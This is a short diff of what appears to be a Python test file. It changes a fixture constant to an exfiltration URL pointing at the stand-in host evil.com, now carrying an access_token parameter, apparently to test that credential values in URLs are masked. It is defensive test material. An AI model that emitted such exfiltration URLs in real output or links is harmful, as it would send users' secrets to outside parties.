@@ -45,7 +45,8 @@ MINTED_TS = "2026-10-01T10:00:00+00:00"
 LATER_TS = "2026-10-01T10:05:00+00:00"
 HEADER = {"type": "section", "text": {"type": "mrkdwn", "text": "Which one?"}}
 EXFIL_BLOB = "A" * 50
-EXFIL_URL = f"https://evil.com/exfil?data={EXFIL_BLOB}"
+#: A credential URL parameter: its value is masked, the rest of the URL stays.
+EXFIL_URL = f"https://evil.com/exfil?access_token={EXFIL_BLOB}"
 
 
 # ---------------------------------------------------------------------------
